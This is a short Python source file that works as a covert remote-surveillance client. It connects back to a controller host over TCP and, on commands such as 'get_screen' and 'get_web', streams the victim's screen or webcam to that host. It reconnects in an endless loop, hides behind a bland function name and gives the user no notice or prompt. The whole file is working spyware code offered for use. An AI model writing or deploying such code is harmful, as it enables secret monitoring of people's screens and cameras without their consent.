import socket
from vidstream import ScreenShareClient, CameraClient


host = 'local ip'
port = 49494





def err():
    while True:
    


        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            while True:

                data = s.recv(1024)
                data = data.decode()

                if data.lower() == 'get_screen':
                    screen = ScreenShareClient(host, 49495)
                    screen.start_stream()
                    s.send(b'STREAMING SCREEN')

                elif data.lower() == 'get_web':
                    try:
                        web = CameraClient(host, 49495)
                        web.start_stream()
                        s.send(b'WEB STREAMING')
                    except:
                        s.send(b'CLIENT NOT HAVE WEB CAMERA')
                elif data.lower() == 'get_screen_stop':
                    screen.stop_stream()
                elif data.lower() == 'get_web_stop':
                    web.stop_stream()
                elif data.lower() == 'exit':
                    screen.stop_stream()
                    web.stop_stream()
                    s.close()
                    err()
                    break
                elif not data:
                    break
        except Exception as ex:
            print(ex)

err()